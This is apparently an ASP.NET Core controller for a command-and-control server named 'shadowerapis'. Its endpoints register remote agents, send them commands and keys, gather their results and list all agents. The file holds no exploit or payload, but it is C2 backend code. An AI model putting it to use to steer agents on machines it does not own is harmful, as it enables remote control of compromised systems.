using Microsoft.AspNetCore.Mvc;
using shadowerapis.Helper;
using shadowerapis.Models;

namespace shadowerapis.Controllers
{
    [Route("agenthandler")]
    [ApiController]
    public class ShadowerController : Controller
    {
        string? strConn = HelperFunctions.GetConnectionString();

        [HttpPost("RegisterAgent")]
        public IActionResult RegisterAgent([FromBody] shadoweragent oshadoweragent)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.RegisterAgent(strConn, oshadoweragent));
            }
            return BadRequest();
        }

        [HttpPost("RegAgen")] //dup for test
        public IActionResult RegAgen([FromBody] shadoweragent oshadoweragent)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.RegisterAgent(strConn, oshadoweragent));
            }
            return BadRequest();
        }

        [HttpPost("GetCommandFromC2")]
        public IActionResult GetCommandFromC2([FromBody] command ogetcommand)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.GetCommandFromC2(strConn, ogetcommand));
            }
            return BadRequest();
        }

        [HttpPost("GetCommandAndKeyFromC2")]
        public IActionResult GetCommandAndKeyFromC2([FromBody] command ogetcommand)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.GetCommandAndKeyDBOps(strConn, ogetcommand));
            }
            return BadRequest();
        }

        [HttpPut("SendCommandToAgent")]
        public IActionResult SendCommandToAgent([FromBody] command osendcommand)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.SendCommandToAgent(strConn, osendcommand));
            }
            return BadRequest();
        }

        [HttpPut("ClearLastCommand")]
        public IActionResult ClearLastCommand([FromBody] command osendcommand)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.ClearLastCommandDBOps(strConn, osendcommand));
            }
            return BadRequest();
        }

        [HttpPut("SendCommandResultToC2")]
        public IActionResult SendCommandResultToC2([FromBody] commandresult osendcommandres)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.SendResultToC2(strConn, osendcommandres));
            }
            return BadRequest();
        }

        [HttpGet("{strAgentID}")]
        public IActionResult GetCommandResultFromAgent(string strAgentID)
        {
            if (strConn != null)
            {
                return Ok(dbops.dbophelper.GetCommandResult(strConn, strAgentID));
            }
            return BadRequest();
        }

        [HttpGet("ListAllAgents")]
        public ActionResult<IEnumerable<shadoweragent>> ListAllAgents()
        {
            return (dbops.dbophelper.ListAllAgents(strConn));
           
        }

    }
}
